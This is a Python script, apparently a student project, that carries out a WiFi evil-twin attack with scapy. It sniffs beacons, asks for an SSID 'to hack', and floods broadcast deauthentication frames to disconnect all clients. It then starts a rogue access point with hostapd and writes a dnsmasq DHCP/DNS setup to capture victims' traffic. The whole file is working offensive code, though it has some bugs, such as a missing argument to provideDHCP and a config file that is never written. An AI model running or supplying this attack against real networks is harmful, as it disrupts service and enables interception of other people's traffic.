from scapy.all import *
from scapy.layers.dot11 import RadioTap, Dot11Deauth, Dot11, Dot11Beacon
import sys
import os

aps_dict = {}
timeOut = 100


def printPretty():
    print("******************************************************")
    for ssid,mac_beacons in aps_dict.items():
        print("> SSID: "+ssid +" -> "+mac_beacons[0] +" beacons: "+ str(mac_beacons[1]))
    print("******************************************************")

def getSSID():
    ssid = ""
    while not(ssid in aps_dict):
        ssid = input("Select SSID to hack \t")
    return ssid

def disconnect_all(gateway_mac, interface):
    target_mac = "ff:ff:ff:ff:ff:ff"
    # 802.11 frame
    # addr1: destination MAC
    # addr2: source MAC
    # addr3: Access Point MAC
    dot11 = Dot11(addr1=target_mac, addr2=gateway_mac, addr3=gateway_mac)
    # stack them up
    packet = RadioTap() / dot11 / Dot11Deauth(reason=7) #radioTap- header in IEEE 802.11,
    # send the packet
    sendp(packet, inter=0.1, count=100, iface=interface, verbose=1)


def createRougeAp(ssid,interface):
    ssid = "DavidBenita"
    nameOfDir = "fakeap"
    nameConfFile = "%s/hostapd.conf" %(nameOfDir)
    channel =6
    text = 'interface=%s\ndriver=nl80211\nssid=%s\nhw_mode=g\nchannel=%d\nmacaddr_acl=0\nignore_broadcast_ssid=0' %(interface,ssid,channel)
    os.system("mkdir -p %s" %(nameOfDir))
    f = open(nameConfFile, "w")
    f.write(text)
    f.close()
    os.system("sudo hostapd %s" % (nameConfFile))


def makeMonitorMode(interfaceName):
    print('Change %s to monitor mode' %(interfaceName))
    os.system('sudo ifconfig %s down' %(interfaceName))
    os.system('sudo iwconfig %s mode monitor' %(interfaceName))
    os.system('sudo ifconfig %s up' %(interfaceName))


def provideDHCP(interface):
    nameOfDir = "fakeap"
    nameConfFile = "%s/dnsmasq.conf" % (nameOfDir)
    ipRangeWithTTL = '192.168.1.2,192.168.1.30,255.255.255.0,12h'
    apIP ='192.168.1.1'
    dnsIP = apIP
    listenAddr = '127.0.0.1'
    netmask = '255.255.255.0'

    text = 'interface=%s\ndhcp-range=%s\ndhcp-option=3,%s\n' \
           'dhcp-option=6,%s\nserver=8.8.8.8\nlog-queries\nlog-dhcp\nlisten-address=%s' %(interface, ipRangeWithTTL, apIP, dnsIP, listenAddr)
    os.system('ifconfig %s up %s netmask %s' %(interface, apIP, netmask))
    #add routing table
    os.system('route add -net 192.168.1.0 netmask %s gw %s' %(netmask, apIP))
    #dnsmasq provide dns server and dhcp server
    os.system('dnsmasq -C %s -d' %(nameConfFile))


def main():
    interfaceName = sys.argv[1]
    #makeMonitorMode(interfaceName)
    print("Sniffing please wait...")
    sniff(prn=scanWifi, iface=interfaceName, count=timeOut)#iface - interface to sniff , prn - function
    print("AP list: ")
    printPretty()
    ssid = getSSID()
    print("Start deauthentication attack on "+ssid)
    disconnect_all(aps_dict[ssid][0],interfaceName)
    createRougeAp(ssid,interfaceName)
    provideDHCP()


def scanWifi(pkt):
    if pkt.haslayer(Dot11Beacon):# check if the pkt is dot11
        if pkt.type == 0 and pkt.subtype == 8:# check if ( type 0-Management , 0 - Beacon)
            #print('SSID: %s MAC: %s'%(pkt.info,pkt.addr3))
            if not (pkt.info.decode("utf-8") in aps_dict):#decode("utf-8") - cast to String
                #SSID- ptk.info MAC- pkt.addr3
                aps_dict[pkt.info.decode("utf-8")] = (pkt.addr3,1)
            else:
                numOfBeacons = aps_dict[pkt.info.decode("utf-8")][1]
                numOfBeacons+=1
                aps_dict[pkt.info.decode("utf-8")] = (pkt.addr3, numOfBeacons)
        else: pass
    else: pass



if __name__ == '__main__':
    main()